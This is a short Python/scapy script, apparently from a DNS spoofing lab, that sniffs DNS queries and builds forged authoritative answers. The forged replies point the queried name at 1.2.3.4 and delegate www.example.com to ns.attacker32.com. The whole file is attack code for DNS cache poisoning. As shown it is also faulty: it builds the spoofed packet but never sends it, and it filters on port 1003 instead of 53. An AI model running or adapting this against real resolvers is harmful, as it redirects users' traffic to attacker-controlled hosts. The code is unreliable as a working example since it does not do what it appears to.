#!/usr/bin/python3

from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP

def spoof_dns(pkt):
	if pkt.haslayer(DNSQR) and pkt.haslayer(UDP):
		ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
		udp = UDP(dport=pkt[UDP].sport, sport=53)

		anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.4')
		nssec = DNSRR(rrname='www.example.com', type='NS', rdata='ns.attacker32.com')
		dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, an=anssec, ns=nssec)

		spoofed_pkt = ip/udp/dns
	pkt.show()

sniff(filter='port 1003', prn=spoof_dns)
